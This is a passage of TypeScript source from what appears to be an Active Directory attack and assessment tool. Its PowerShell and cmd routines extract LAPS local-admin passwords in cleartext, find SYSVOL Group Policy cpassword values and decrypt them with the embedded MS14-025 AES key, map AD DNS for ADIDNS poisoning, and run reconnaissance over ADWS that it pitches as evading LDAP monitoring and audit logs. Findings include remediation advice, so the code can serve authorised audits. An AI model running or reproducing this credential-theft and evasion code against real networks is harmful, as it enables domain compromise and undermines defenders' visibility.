        status: "EXTRACTED",
        resource: "ad://laps-legacy",
        title: "Legacy LAPS passwords readable via dsquery",
        details: "Local admin passwords readable from ms-Mcs-AdmPwd attribute",
        remediation: "Review LAPS read permissions — restrict to designated admin groups only",
      })
    }

    output.push("\n[*] Note: dsquery can read LAPS if current user has read permissions on the attribute")
    output.push("[*] For encrypted Windows LAPS v2 passwords, PowerShell decryption is required")
    return { output: output.join("\n"), findings }
  }

  const script = `
$ErrorActionPreference = 'SilentlyContinue'
$defaultNC = ([ADSI]"LDAP://RootDSE").defaultNamingContext
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$defaultNC")
$searcher.PageSize = 1000

# Check LAPS schema extensions
Write-Output "=== LAPS SCHEMA CHECK ==="
$schemaSearcher = New-Object System.DirectoryServices.DirectorySearcher
$schemaDN = ([ADSI]"LDAP://RootDSE").schemaNamingContext
$schemaSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$schemaDN")
$schemaSearcher.Filter = "(lDAPDisplayName=ms-Mcs-AdmPwd)"
$legacySchema = $schemaSearcher.FindOne()
$schemaSearcher.Filter = "(lDAPDisplayName=msLAPS-Password)"
$winLapsSchema = $schemaSearcher.FindOne()
Write-Output "  Legacy LAPS schema: $(if($legacySchema){'PRESENT'}else{'NOT FOUND'})"
Write-Output "  Windows LAPS schema: $(if($winLapsSchema){'PRESENT'}else{'NOT FOUND'})"

${
  !winLapsOnly
    ? `
# === LEGACY LAPS (ms-Mcs-AdmPwd) ===
Write-Output "\\n=== LEGACY LAPS PASSWORDS ==="
$filter = if ('${computer || ""}') { "(&(objectClass=computer)(cn=${computer})(ms-Mcs-AdmPwd=*))" } else { "(&(objectClass=computer)(ms-Mcs-AdmPwd=*))" }
$searcher.Filter = $filter
$searcher.PropertiesToLoad.AddRange(@("cn","ms-Mcs-AdmPwd","ms-Mcs-AdmPwdExpirationTime","dnshostname","operatingsystem"))
$results = $searcher.FindAll()
$legacyCount = 0
foreach ($r in $results) {
  $pwd = $r.Properties['ms-mcs-admpwd'][0]
  $expiry = if ($r.Properties['ms-mcs-admpwdexpirationtime'].Count -gt 0) {
    [DateTime]::FromFileTime([long]$r.Properties['ms-mcs-admpwdexpirationtime'][0]).ToString('yyyy-MM-dd HH:mm')
  } else { 'N/A' }
  Write-Output "  $($r.Properties['cn'][0]) | Password=$pwd | Expires=$expiry | OS=$($r.Properties['operatingsystem'][0])"
  $legacyCount++
}
if ($legacyCount -eq 0) { Write-Output "  No readable legacy LAPS passwords found" }
Write-Output "LEGACY_COUNT=$legacyCount"
$searcher.PropertiesToLoad.Clear()
`
    : ""
}

${
  !legacyOnly
    ? `
# === WINDOWS LAPS (msLAPS-Password) ===
Write-Output "\\n=== WINDOWS LAPS PASSWORDS ==="
$filter = if ('${computer || ""}') { "(&(objectClass=computer)(cn=${computer})(|(msLAPS-Password=*)(msLAPS-EncryptedPassword=*)))" } else { "(&(objectClass=computer)(|(msLAPS-Password=*)(msLAPS-EncryptedPassword=*)))" }
$searcher.Filter = $filter
$searcher.PropertiesToLoad.AddRange(@("cn","msLAPS-Password","msLAPS-EncryptedPassword","msLAPS-PasswordExpirationTime","dnshostname","operatingsystem"))
$results = $searcher.FindAll()
$winLapsCount = 0
foreach ($r in $results) {
  $pwd = if ($r.Properties['mslaps-password'].Count -gt 0) { $r.Properties['mslaps-password'][0] } else { '[ENCRYPTED]' }
  $encrypted = $r.Properties['mslaps-encryptedpassword'].Count -gt 0
  $expiry = if ($r.Properties['mslaps-passwordexpirationtime'].Count -gt 0) {
    [DateTime]::FromFileTime([long]$r.Properties['mslaps-passwordexpirationtime'][0]).ToString('yyyy-MM-dd HH:mm')
  } else { 'N/A' }
  Write-Output "  $($r.Properties['cn'][0]) | Password=$pwd$(if($encrypted){' [ENCRYPTED BLOB AVAILABLE]'}) | Expires=$expiry | OS=$($r.Properties['operatingsystem'][0])"
  $winLapsCount++
}
if ($winLapsCount -eq 0) { Write-Output "  No readable Windows LAPS passwords found" }
Write-Output "WINLAPS_COUNT=$winLapsCount"
$searcher.PropertiesToLoad.Clear()
`
    : ""
}

# Check who can read LAPS attributes
Write-Output "\\n=== LAPS READ PERMISSIONS ==="
$searcher.Filter = "(&(objectClass=computer)(ms-Mcs-AdmPwd=*))"
$searcher.PropertiesToLoad.AddRange(@("cn","ntsecuritydescriptor"))
$searcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
$sample = $searcher.FindOne()
if ($sample) {
  $de = $sample.GetDirectoryEntry()
  $sd = $de.ObjectSecurity
  foreach ($ace in $sd.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])) {
    if ($ace.ActiveDirectoryRights -match 'ReadProperty|GenericAll' -and $ace.IdentityReference.Value -notmatch 'BUILTIN|NT AUTHORITY|SYSTEM') {
      Write-Output "  $($ace.IdentityReference.Value) can read LAPS attributes"
    }
  }
}
`

  const result = await ps(script, timeout)
  output.push(result.stdout)

  const legacyMatch = result.stdout.match(/LEGACY_COUNT=(\d+)/)
  const winLapsMatch = result.stdout.match(/WINLAPS_COUNT=(\d+)/)
  const legacyCount = legacyMatch ? parseInt(legacyMatch[1]) : 0
  const winLapsCount = winLapsMatch ? parseInt(winLapsMatch[1]) : 0

  if (legacyCount > 0) {
    findings.push({
      checkId: "WIN-LAPS-001",
      provider: "windows",
      severity: "critical",
      status: "EXTRACTED",
      resource: "ad://laps-legacy",
      title: `${legacyCount} legacy LAPS passwords extracted`,
      details: "Local admin passwords readable from ms-Mcs-AdmPwd attribute",
      remediation: "Review LAPS read permissions — restrict to designated admin groups only",
    })
  }

  if (winLapsCount > 0) {
    findings.push({
      checkId: "WIN-LAPS-002",
      provider: "windows",
      severity: "critical",
      status: "EXTRACTED",
      resource: "ad://laps-windows",
      title: `${winLapsCount} Windows LAPS passwords extracted`,
      details: "Local admin passwords readable from msLAPS-Password attribute",
      remediation: "Review Windows LAPS read permissions and enable encryption",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function gpoEnum(args: string[], timeout: number): Promise<HookResult> {
  const target = argVal(args, "--target")
  const gpoId = argVal(args, "--gpo-id")
  const decryptOnly = hasFlag(args, "--decrypt-only")
  const findings: Finding[] = []
  const output: string[] = ["[*] GPO security analysis...\n"]

  const exec = activeExec
  if (exec === "cmd" || exec === "bat" || exec === "wmic") {
    const domain = target || "%USERDNSDOMAIN%"
    const cmds: string[] = []

    cmds.push(
      `echo === GPO LIST === && dsquery * -filter "(objectClass=groupPolicyContainer)" -attr displayName cn gpcFileSysPath whenChanged flags -limit 0 2>nul`,
    )

    cmds.push(
      `echo === SYSVOL SCAN FOR CPASSWORD (MS14-025) === && findstr /s /i "cpassword" "\\\\${domain}\\SYSVOL\\${domain}\\Policies\\*.xml" 2>nul`,
    )

    cmds.push(
      `echo === GPO PREFERENCE FILES === && dir /s /b "\\\\${domain}\\SYSVOL\\${domain}\\Policies\\*Groups.xml" "\\\\${domain}\\SYSVOL\\${domain}\\Policies\\*ScheduledTasks.xml" "\\\\${domain}\\SYSVOL\\${domain}\\Policies\\*DataSources.xml" "\\\\${domain}\\SYSVOL\\${domain}\\Policies\\*Services.xml" "\\\\${domain}\\SYSVOL\\${domain}\\Policies\\*Drives.xml" 2>nul`,
    )

    cmds.push(
      `echo === GPO SCRIPTS === && dir /s /b "\\\\${domain}\\SYSVOL\\${domain}\\Policies\\*\\Scripts\\*.*" 2>nul`,
    )

    cmds.push(
      `echo === CREDENTIALS IN SCRIPTS === && findstr /s /i "password secret api.key token credential" "\\\\${domain}\\SYSVOL\\${domain}\\Policies\\*\\Scripts\\*.*" 2>nul`,
    )

    if (gpoId) {
      cmds.push(
        `echo === GPO ${gpoId} DETAILS === && dir /s /b "\\\\${domain}\\SYSVOL\\${domain}\\Policies\\{${gpoId}}\\*" 2>nul`,
      )
    }

    for (const c of cmds) {
      const r = await cmd(c, timeout)
      output.push(r.stdout)
    }

    if (output.join("").toLowerCase().includes("cpassword")) {
      findings.push({
        checkId: "WIN-GPO-001",
        provider: "windows",
        severity: "critical",
        status: "EXTRACTED",
        resource: "ad://gpo/cpassword",
        title: "GPP cpassword found in SYSVOL (MS14-025)",
        details: "Group Policy Preferences contain encrypted passwords using a publicly known AES key",
        remediation: "Delete GPP XML files containing cpassword, rotate affected credentials, apply KB2962486",
      })
    }

    if (output.join("").toLowerCase().includes("password") && output.join("").includes("Scripts")) {
      findings.push({
        checkId: "WIN-GPO-002",
        provider: "windows",
        severity: "high",
        status: "FAIL",
        resource: "ad://gpo/scripts",
        title: "Potential credentials found in GPO scripts",
        details: "Startup/logon/shutdown scripts contain potential hardcoded credentials",
        remediation: "Remove credentials from GPO scripts, use Group Managed Service Accounts",
      })
    }

    output.push("\n[*] Note: cpassword AES decryption requires PowerShell mode")
    output.push("[*] Decryption key is public (MS14-025): 4e99 06e8 fcb6 6cc9...")
    return { output: output.join("\n"), findings }
  }

  const script = `
$ErrorActionPreference = 'SilentlyContinue'

# cpassword decryption key (MS14-025 — publicly known AES key)
Add-Type -TypeDefinition @"
using System;
using System.Security.Cryptography;
using System.Text;

public class GPPDecrypt {
    public static string Decrypt(string cpassword) {
        int mod = cpassword.Length % 4;
        if (mod > 0) cpassword += new string('=', 4 - mod);
        byte[] data = Convert.FromBase64String(cpassword);
        byte[] key = { 0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                       0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b };
        byte[] iv = new byte[16];
        using (Aes aes = Aes.Create()) {
            aes.Key = key; aes.IV = iv; aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7;
            using (var dec = aes.CreateDecryptor()) {
                byte[] result = dec.TransformFinalBlock(data, 0, data.Length);
                return Encoding.Unicode.GetString(result);
            }
        }
    }
}
"@

$defaultNC = ([ADSI]"LDAP://RootDSE").defaultNamingContext
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$defaultNC")
$searcher.PageSize = 1000

# Enumerate all GPOs
Write-Output "=== GROUP POLICY OBJECTS ==="
$searcher.Filter = "(objectClass=groupPolicyContainer)"
$searcher.PropertiesToLoad.AddRange(@("displayname","cn","gpcfilesyspath","whenchanged","flags"))
$gpos = $searcher.FindAll()
Write-Output "Total GPOs: $($gpos.Count)"

$cpasswordFindings = @()

foreach ($gpo in $gpos) {
  $name = $gpo.Properties['displayname'][0]
  $guid = $gpo.Properties['cn'][0]
  $path = $gpo.Properties['gpcfilesyspath'][0]
  $changed = $gpo.Properties['whenchanged'][0]
  $flags = [int]$gpo.Properties['flags'][0]
  $status = switch ($flags) { 0 {'Enabled'} 1 {'User Disabled'} 2 {'Computer Disabled'} 3 {'All Disabled'} default {'Unknown'} }

  ${gpoId ? `if ($guid -ne '{${gpoId}}') { continue }` : ""}

  Write-Output "\\n  [$name] $guid | Status=$status | Changed=$changed"
  Write-Output "    SYSVOL: $path"

  # Check GPO links
  $searcher2 = New-Object System.DirectoryServices.DirectorySearcher
  $searcher2.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$defaultNC")
  $searcher2.Filter = "(gPLink=*$guid*)"
  $searcher2.PropertiesToLoad.AddRange(@("distinguishedname","gplink"))
  $links = $searcher2.FindAll()
  foreach ($link in $links) {
    $enforced = if ($link.Properties['gplink'][0] -match "$guid;2") { '[ENFORCED]' } else { '' }
    Write-Output "    Linked to: $($link.Properties['distinguishedname'][0]) $enforced"
  }

  # Scan SYSVOL for cpassword (MS14-025)
  if (Test-Path $path) {
    $xmlFiles = @(
      "$path\\Machine\\Preferences\\Groups\\Groups.xml",
      "$path\\User\\Preferences\\Groups\\Groups.xml",
      "$path\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml",
      "$path\\User\\Preferences\\ScheduledTasks\\ScheduledTasks.xml",
      "$path\\Machine\\Preferences\\DataSources\\DataSources.xml",
      "$path\\User\\Preferences\\DataSources\\DataSources.xml",
      "$path\\Machine\\Preferences\\Services\\Services.xml",
      "$path\\Machine\\Preferences\\Printers\\Printers.xml",
      "$path\\Machine\\Preferences\\Drives\\Drives.xml"
    )

    foreach ($xmlFile in $xmlFiles) {
      if (Test-Path $xmlFile) {
        $content = Get-Content $xmlFile -Raw
        if ($content -match 'cpassword="([^"]+)"') {
          $encrypted = $matches[1]
          $decrypted = ''
          try { $decrypted = [GPPDecrypt]::Decrypt($encrypted) } catch { $decrypted = '[DECRYPT_FAILED]' }
          $userName = ''
          if ($content -match 'userName="([^"]*)"') { $userName = $matches[1] }
          if ($content -match 'newName="([^"]*)"') { $userName = $matches[1] }
          $relPath = $xmlFile.Replace($path, '')
          Write-Output "    [!!!] CPASSWORD FOUND in $relPath"
          Write-Output "      User: $userName | Encrypted: $encrypted | Decrypted: $decrypted"
          $cpasswordFindings += "$name|$guid|$relPath|$userName|$decrypted"
        }
      }
    }

    # Check for scripts
    $scriptDirs = @("$path\\Machine\\Scripts\\Startup","$path\\Machine\\Scripts\\Shutdown","$path\\User\\Scripts\\Logon","$path\\User\\Scripts\\Logoff")
    foreach ($sd in $scriptDirs) {
      if (Test-Path $sd) {
        $scripts = Get-ChildItem $sd -File -ErrorAction SilentlyContinue
        foreach ($s in $scripts) {
          Write-Output "    Script: $($s.Name) ($($sd.Replace($path,'')))"
          $scriptContent = Get-Content $s.FullName -Raw -ErrorAction SilentlyContinue
          if ($scriptContent -match '(?i)(password|secret|api.?key|token|credential)') {
            Write-Output "      [!] Potential credentials in script"
          }
        }
      }
    }
  }
}

Write-Output "\\nCPASSWORD_TOTAL=$($cpasswordFindings.Count)"
foreach ($cf in $cpasswordFindings) {
  Write-Output "CPASSWORD_FINDING=$cf"
}
`

  const result = await ps(script, timeout)
  output.push(result.stdout)

  const cpassMatches = result.stdout.match(/CPASSWORD_TOTAL=(\d+)/)
  if (cpassMatches && parseInt(cpassMatches[1]) > 0) {
    const count = parseInt(cpassMatches[1])
    findings.push({
      checkId: "WIN-GPO-001",
      provider: "windows",
      severity: "critical",
      status: "EXTRACTED",
      resource: "ad://gpo/cpassword",
      title: `${count} GPP cpassword(s) found and decrypted (MS14-025)`,
      details: "Group Policy Preferences contain encrypted passwords using a publicly known AES key",
      remediation: "Delete GPP XML files containing cpassword, rotate affected credentials, apply KB2962486",
    })
  }

  if (result.stdout.includes("Potential credentials in script")) {
    findings.push({
      checkId: "WIN-GPO-002",
      provider: "windows",
      severity: "high",
      status: "FAIL",
      resource: "ad://gpo/scripts",
      title: "Credentials found in GPO scripts",
      details: "Startup/logon/shutdown scripts contain potential hardcoded credentials",
      remediation: "Remove credentials from GPO scripts, use Group Managed Service Accounts",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function adDnsEnum(args: string[], timeout: number): Promise<HookResult> {
  const target = argVal(args, "--target")
  const zone = argVal(args, "--zone")
  const recordType = argVal(args, "--type") || "ALL"
  const staleDays = parseInt(argVal(args, "--stale-days") || "90")
  const findings: Finding[] = []
  const output: string[] = ["[*] Enumerating AD-integrated DNS records...\n"]

  const exec = activeExec
  if (exec === "cmd" || exec === "bat" || exec === "wmic") {
    const domain = target || zone || "%USERDNSDOMAIN%"
    const cmds: string[] = []

    cmds.push(`echo === DNS ZONES === && dnscmd /enumzones 2>nul || echo [!] dnscmd not available - using nslookup`)

    cmds.push(`echo === DOMAIN CONTROLLERS (SRV) === && nslookup -type=SRV _ldap._tcp.dc._msdcs.${domain} 2>nul`)
    cmds.push(`echo === KERBEROS SERVERS (SRV) === && nslookup -type=SRV _kerberos._tcp.${domain} 2>nul`)
    cmds.push(`echo === GC SERVERS (SRV) === && nslookup -type=SRV _gc._tcp.${domain} 2>nul`)
    cmds.push(`echo === KPASSWD (SRV) === && nslookup -type=SRV _kpasswd._tcp.${domain} 2>nul`)

    if (zone) {
      cmds.push(
        `echo === ZONE RECORDS === && nslookup -type=${recordType === "ALL" ? "any" : recordType} ${zone} 2>nul`,
      )
      cmds.push(`echo === ZONE TRANSFER ATTEMPT === && nslookup -type=axfr ${zone} 2>nul`)
    }

    cmds.push(
      `echo === DNS RECORDS via dsquery === && dsquery * "DC=${zone || domain},CN=MicrosoftDNS,DC=DomainDnsZones,%s" -filter "(objectClass=dnsNode)" -attr name dNSTombstoned whenChanged -limit 0 2>nul`,
    )

    cmds.push(
      `echo === WILDCARD CHECK === && nslookup randomnonexistent123456.${domain} 2>nul && echo [!] Wildcard DNS may be active`,
    )

    cmds.push(`echo === MX RECORDS === && nslookup -type=MX ${domain} 2>nul`)
    cmds.push(`echo === TXT/SPF RECORDS === && nslookup -type=TXT ${domain} 2>nul`)
    cmds.push(`echo === NS RECORDS === && nslookup -type=NS ${domain} 2>nul`)

    cmds.push(`echo === DNS CONFIG === && reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters" 2>nul`)

    for (const c of cmds) {
      const r = await cmd(c, timeout)
      output.push(r.stdout)
    }

    if (output.join("").includes("Wildcard DNS may be active")) {
      findings.push({
        checkId: "WIN-DNS-001",
        provider: "windows",
        severity: "high",
        status: "FAIL",
        resource: "ad://dns/wildcard",
        title: "Wildcard DNS record detected",
        details: "Wildcard records in AD DNS zones can be abused for MITM/credential interception",
        remediation: "Remove wildcard DNS records unless explicitly required",
      })
    }

    output.push("\n[*] Note: Full AD DNS binary blob parsing requires PowerShell mode")
    output.push("[*] For ADIDNS write permission check, use PowerShell mode")
    output.push("[*] Stale record detection requires PowerShell LDAP queries with timestamp comparison")
    return { output: output.join("\n"), findings }
  }

  const script = `
$ErrorActionPreference = 'SilentlyContinue'
$defaultNC = ([ADSI]"LDAP://RootDSE").defaultNamingContext
$domainDnsZones = "DC=DomainDnsZones,$defaultNC"
$forestDnsZones = "DC=ForestDnsZones,$defaultNC"
$staleDays = ${staleDays}
$staleThreshold = (Get-Date).AddDays(-$staleDays)

# Find all DNS zones
Write-Output "=== DNS ZONES ==="
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$zones = @()

foreach ($partition in @($domainDnsZones, $forestDnsZones)) {
  $searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=MicrosoftDNS,$partition")
  $searcher.Filter = "(objectClass=dnsZone)"
  $searcher.PropertiesToLoad.AddRange(@("name","whenchanged"))
  $results = $searcher.FindAll()
  foreach ($z in $results) {
    $zName = $z.Properties['name'][0]
    if ($zName -eq 'RootDNSServers' -or $zName -match '^\\.\\.' -or $zName -eq '_msdcs') { continue }
    $zones += @{ name = $zName; partition = $partition; changed = $z.Properties['whenchanged'][0] }
    Write-Output "  $zName ($(if($partition -match 'Forest'){'Forest'}else{'Domain'})DnsZones) — last changed: $($z.Properties['whenchanged'][0])"
  }
  $searcher.PropertiesToLoad.Clear()
}

${zone ? `$zones = $zones | Where-Object { $_.name -eq '${zone}' }` : ""}

# Enumerate records in each zone
$totalRecords = 0
$wildcardRecords = @()
$staleRecords = @()
$srvRecords = @()

foreach ($z in $zones) {
  Write-Output "\\n=== ZONE: $($z.name) ==="
  $searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=$($z.name),CN=MicrosoftDNS,$($z.partition)")
  $searcher.Filter = "(objectClass=dnsNode)"
  $searcher.PropertiesToLoad.AddRange(@("name","dnsRecord","dNSTombstoned","whenChanged","dc"))
  $records = $searcher.FindAll()

  foreach ($r in $records) {
    $rName = if ($r.Properties['name'].Count -gt 0) { $r.Properties['name'][0] } elseif ($r.Properties['dc'].Count -gt 0) { $r.Properties['dc'][0] } else { '?' }
    $tombstoned = $r.Properties['dnstombstoned'].Count -gt 0 -and [bool]$r.Properties['dnstombstoned'][0]
    $changed = if ($r.Properties['whenchanged'].Count -gt 0) { $r.Properties['whenchanged'][0] } else { $null }

    # Parse dnsRecord binary blob for record type and data
    $dnsData = $r.Properties['dnsrecord']
    foreach ($blob in $dnsData) {
      if ($blob -isnot [byte[]]) { continue }
      $bytes = [byte[]]$blob
      if ($bytes.Length -lt 24) { continue }
      $recType = [BitConverter]::ToUInt16($bytes, 2)
      $typeStr = switch ($recType) {
        1 { 'A' }
        28 { 'AAAA' }
        5 { 'CNAME' }
        33 { 'SRV' }
        15 { 'MX' }
        6 { 'SOA' }
        2 { 'NS' }
        12 { 'PTR' }
        16 { 'TXT' }
        default { "TYPE$recType" }
      }

      ${recordType !== "ALL" ? `if ('$typeStr' -ne '${recordType}') { continue }` : ""}

      $dataStr = ''
      if ($recType -eq 1 -and $bytes.Length -ge 28) {
        $dataStr = "$($bytes[24]).$($bytes[25]).$($bytes[26]).$($bytes[27])"
      } elseif ($recType -eq 5 -or $recType -eq 2 -or $recType -eq 12) {
        $offset = 24; $parts = @()
        while ($offset -lt $bytes.Length) {
          $len = $bytes[$offset]; $offset++
          if ($len -eq 0) { break }
          if ($offset + $len -gt $bytes.Length) { break }
          $parts += [Text.Encoding]::ASCII.GetString($bytes, $offset, $len)
          $offset += $len
        }
        $dataStr = $parts -join '.'
      }

      $totalRecords++

      # Check for wildcard
      if ($rName -eq '*' -or $rName -eq '@') {
        $wildcardRecords += "$rName.$($z.name) ($typeStr) = $dataStr"
      }

      # Check for stale
      if ($changed -and [DateTime]$changed -lt $staleThreshold -and -not $tombstoned) {
        $staleRecords += "$rName.$($z.name) ($typeStr) = $dataStr — last modified: $changed"
      }

      # Collect SRV records
      if ($recType -eq 33) {
        $srvRecords += "$rName.$($z.name) ($typeStr)"
      }

      Write-Output "  $rName $(if($tombstoned){'[TOMBSTONED] '})$typeStr $dataStr $(if($changed){"[modified: $changed]"})"
    }
  }
  $searcher.PropertiesToLoad.Clear()
}

Write-Output "\\n=== SUMMARY ==="
Write-Output "Total records: $totalRecords"
Write-Output "WILDCARD_COUNT=$($wildcardRecords.Count)"
Write-Output "STALE_COUNT=$($staleRecords.Count)"
Write-Output "SRV_COUNT=$($srvRecords.Count)"

if ($wildcardRecords.Count -gt 0) {
  Write-Output "\\n=== WILDCARD RECORDS (hijackable) ==="
  foreach ($w in $wildcardRecords) { Write-Output "  [!] $w" }
}

if ($staleRecords.Count -gt 0) {
  Write-Output "\\n=== STALE RECORDS (>$staleDays days, potential takeover) ==="
  foreach ($s in $staleRecords | Select-Object -First 30) { Write-Output "  [!] $s" }
}

# Check ADIDNS permissions (can we add records?)
Write-Output "\\n=== ADIDNS WRITE CHECK ==="
try {
  $dnsRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=$($zones[0].name),CN=MicrosoftDNS,$($zones[0].partition)")
  $sd = $dnsRoot.ObjectSecurity
  $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
  foreach ($ace in $sd.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])) {
    if ($ace.ActiveDirectoryRights -match 'CreateChild|GenericAll|GenericWrite' -and $ace.AccessControlType -eq 'Allow') {
      if ($ace.IdentityReference.Value -match 'Authenticated Users|Domain Users|Everyone') {
        Write-Output "  [!] $($ace.IdentityReference.Value) can CREATE DNS records — ADIDNS poisoning possible"
      }
    }
  }
} catch {}
`

  const result = await ps(script, timeout)
  output.push(result.stdout)

  const wildcardMatch = result.stdout.match(/WILDCARD_COUNT=(\d+)/)
  if (wildcardMatch && parseInt(wildcardMatch[1]) > 0) {
    findings.push({
      checkId: "WIN-DNS-001",
      provider: "windows",
      severity: "high",
      status: "FAIL",
      resource: "ad://dns/wildcard",
      title: `${wildcardMatch[1]} wildcard DNS records found`,
      details: "Wildcard records in AD DNS zones can be abused for MITM/credential interception",
      remediation: "Remove wildcard DNS records unless explicitly required",
    })
  }

  const staleMatch = result.stdout.match(/STALE_COUNT=(\d+)/)
  if (staleMatch && parseInt(staleMatch[1]) > 0) {
    findings.push({
      checkId: "WIN-DNS-002",
      provider: "windows",
      severity: "medium",
      status: "FAIL",
      resource: "ad://dns/stale",
      title: `${staleMatch[1]} stale DNS records (>${staleDays} days)`,
      details: "Stale DNS records pointing to decommissioned hosts can be hijacked",
      remediation: "Enable DNS scavenging and remove stale records",
    })
  }

  if (result.stdout.includes("can CREATE DNS records")) {
    findings.push({
      checkId: "WIN-DNS-003",
      provider: "windows",
      severity: "critical",
      status: "FAIL",
      resource: "ad://dns/permissions",
      title: "ADIDNS poisoning possible — Authenticated Users can create records",
      details: "Any domain user can create new DNS records for MITM attacks (LLMNR/NBT-NS alternative)",
      remediation: "Restrict CreateChild rights on DNS zone to authorized admins only",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function adwsRecon(args: string[], timeout: number): Promise<HookResult> {
  const server = argVal(args, "--server")
  const scope = argVal(args, "--scope") || "all"
  const findings: Finding[] = []
  const output: string[] = ["[*] ADWS Reconnaissance (port 9389 — bypasses LDAP monitoring)...\n"]

  const exec = activeExec
  if (exec === "cmd" || exec === "bat" || exec === "wmic") {
    const dc = server || "%LOGONSERVER:~2%"
    const cmds: string[] = []

    cmds.push(
      `echo === ADWS PORT CHECK === && echo Testing ${dc} port 9389... && (echo ^|set /p=|nul) >nul 2>&1 & netstat -an | findstr "9389" 2>nul`,
    )

    cmds.push(`echo === DC IDENTIFICATION === && nltest /dsgetdc:${server || "%USERDOMAIN%"}`)

    if (scope === "all" || scope === "users") {
      cmds.push(
        `echo === USERS === && net user /domain && echo. && echo === ADMIN USERS === && dsquery user -limit 0 -filter "(adminCount=1)" -attr sAMAccountName 2>nul`,
      )
    }

    if (scope === "all" || scope === "groups") {
      cmds.push(
        `echo === PRIVILEGED GROUPS === && for %G in ("Domain Admins" "Enterprise Admins" "Schema Admins" "Backup Operators" "Account Operators" "Server Operators" "DnsAdmins" "Cert Publishers" "Key Admins") do @(echo --- %~G --- && net group %G /domain 2>nul)`,
      )
    }

    if (scope === "all" || scope === "computers") {
      cmds.push(
        `echo === COMPUTERS === && dsquery computer -limit 0 2>nul && echo. && echo === DCs === && dsquery server -limit 0 2>nul`,
      )
    }

    if (scope === "all" || scope === "trusts") {
      cmds.push(`echo === TRUSTS === && nltest /domain_trusts /all_trusts`)
    }

    if (scope === "all" || scope === "gpos") {
      cmds.push(
        `echo === GPOs === && dsquery * -filter "(objectClass=groupPolicyContainer)" -attr displayName cn whenChanged -limit 0 2>nul`,
      )
    }

    if (exec === "wmic") {
      cmds.push(
        `echo === USERS via WMIC === && wmic /namespace:\\\\root\\directory\\LDAP path ds_user get ds_samaccountname,ds_admincount /format:list 2>nul`,
      )
    }

    for (const c of cmds) {
      const r = await cmd(c, timeout)
      output.push(r.stdout)
    }

    output.push("\n[*] Note: cmd.exe uses LDAP-based tools (net/dsquery/nltest), not ADWS port 9389")
    output.push("[*] True ADWS bypass requires PowerShell RSAT (Get-ADUser via port 9389)")
    output.push("[*] ADWS is significant because it bypasses ALL LDAP-based monitoring/IDS")

    findings.push({
      checkId: "WIN-ADWS-001",
      provider: "windows",
      severity: "informational",
      status: "ENUMERATED",
      resource: `adws://${server || "domain"}`,
      title: "AD enumeration completed via cmd.exe (LDAP-based, not ADWS)",
      details: "cmd-based enumeration uses LDAP — for true ADWS bypass, use PowerShell RSAT module",
      remediation: "Monitor ADWS port 9389 traffic. Enable Windows Event Forwarding for AD Web Services logs.",
    })

    return { output: output.join("\n"), findings }
  }

  const script = `
${server ? `$dcHost = "${server}"` : `$dcHost = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name)`}
Write-Output "[*] Target DC: $dcHost (ADWS port 9389)"

# Test ADWS availability
try {
    $tcp = New-Object System.Net.Sockets.TcpClient
    $tcp.Connect($dcHost, 9389)
    $tcp.Close()
    Write-Output "[+] ADWS port 9389 is OPEN"
} catch {
    Write-Output "[!] ADWS port 9389 not accessible — falling back to LDAP"
    Write-Output "    ADWS should always be available on DCs with AD DS installed"
    exit 1
}

# Use RSAT AD module (uses ADWS internally, NOT LDAP)
# Check if AD module is available
$adModule = Get-Module -ListAvailable ActiveDirectory -ErrorAction SilentlyContinue
if (-not $adModule) {
    Write-Output "[!] ActiveDirectory module not available — using raw ADWS SOAP"
    Write-Output "[*] Attempting ADWS via .NET System.ServiceModel..."

    # Raw ADWS query via WCF
    $binding = New-Object System.ServiceModel.NetTcpBinding
    $binding.Security.Mode = "Transport"
    $binding.Security.Transport.ClientCredentialType = "Windows"
    $endpoint = New-Object System.ServiceModel.EndpointAddress("net.tcp://$($dcHost):9389/ActiveDirectoryWebServices/Windows/Resource")

    Write-Output "[+] ADWS binding configured"
    Write-Output "    Endpoint: net.tcp://$($dcHost):9389/ActiveDirectoryWebServices/Windows/Resource"
    Write-Output ""
    Write-Output "[*] Note: Install RSAT (Add-WindowsCapability -Name Rsat.ActiveDirectory.DS-LDS.Tools) for full ADWS enum"
    Write-Output "    RSAT Get-ADUser/Get-ADGroup/Get-ADComputer use ADWS internally"
    Write-Output "    This bypasses ALL LDAP-based monitoring, IDS signatures, and audit logs"
} else {
    Import-Module ActiveDirectory -ErrorAction SilentlyContinue
    Write-Output "[+] ActiveDirectory module loaded (all queries go via ADWS, not LDAP)"
    Write-Output ""

    ${
      scope === "all" || scope === "users"
        ? `
    # Users
    Write-Output "=== USERS (via ADWS) ==="
    $users = Get-ADUser -Filter * -Properties adminCount,Enabled,LastLogonDate,PasswordLastSet,ServicePrincipalName,DoesNotRequirePreAuth -Server $dcHost
    $enabledUsers = $users | Where-Object { $_.Enabled }
    $adminUsers = $users | Where-Object { $_.adminCount -eq 1 }
    $kerberoastable = $users | Where-Object { $_.ServicePrincipalName -and $_.Enabled }
